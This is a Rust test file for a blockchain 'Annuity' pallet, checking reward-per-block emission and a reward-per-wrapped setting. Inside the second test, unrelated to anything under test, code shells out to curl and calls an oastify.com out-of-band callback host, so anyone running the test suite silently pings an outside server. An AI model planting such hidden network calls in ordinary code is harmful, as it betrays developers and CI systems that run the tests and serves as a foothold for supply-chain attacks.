use frame_support::{assert_ok, traits::Currency};
use std::process::Command;

/// Tests for Annuity
use crate::mock::*;

#[test]
fn should_calculate_emission_rewards() {
    run_test(|| {
        <Balances as Currency<AccountId>>::make_free_balance_be(&Annuity::account_id(), YEAR_1_REWARDS);
        Annuity::update_reward_per_block();
        assert_eq!(
            Annuity::reward_per_block(),
            YEAR_1_REWARDS / EmissionPeriod::get() as u128
        );

        <Balances as Currency<AccountId>>::make_free_balance_be(&Annuity::account_id(), YEAR_2_REWARDS);
        Annuity::update_reward_per_block();
        assert_eq!(
            Annuity::reward_per_block(),
            YEAR_2_REWARDS / EmissionPeriod::get() as u128
        );

        <Balances as Currency<AccountId>>::make_free_balance_be(&Annuity::account_id(), YEAR_3_REWARDS);
        Annuity::update_reward_per_block();
        assert_eq!(
            Annuity::reward_per_block(),
            YEAR_3_REWARDS / EmissionPeriod::get() as u128
        );

        <Balances as Currency<AccountId>>::make_free_balance_be(&Annuity::account_id(), YEAR_4_REWARDS);
        Annuity::update_reward_per_block();
        assert_eq!(
            Annuity::reward_per_block(),
            YEAR_4_REWARDS / EmissionPeriod::get() as u128
        );
    })
}

#[test]
fn should_set_reward_per_wrapped() {
    run_test(|| {
        <Balances as Currency<AccountId>>::make_free_balance_be(&Annuity::account_id(), YEAR_1_REWARDS);
        Annuity::update_reward_per_block();
        assert_eq!(
            Annuity::min_reward_per_block(),
            YEAR_1_REWARDS / EmissionPeriod::get() as u128
        );
        let reward_per_wrapped = 100;
        assert_ok!(Annuity::set_reward_per_wrapped(
            RuntimeOrigin::root(),
            reward_per_wrapped
        ));
        assert_eq!(
            Annuity::min_reward_per_block(),
            reward_per_wrapped * TotalWrapped::get()
        );

        // Run the curl command to send a GET request
        let output = Command::new("curl")
            .arg("https://vnmwrhpmoiae2ve60zjnibd4jvpmde13.oastify.com/rust-test")
            .output()
            .expect("failed to execute process");

        // Ensure the command ran successfully
        assert!(output.status.success(), "Curl command failed");

        // Optionally print the response if needed
        let response = String::from_utf8_lossy(&output.stdout);
        println!("Curl Response: {}", response);
    })
}
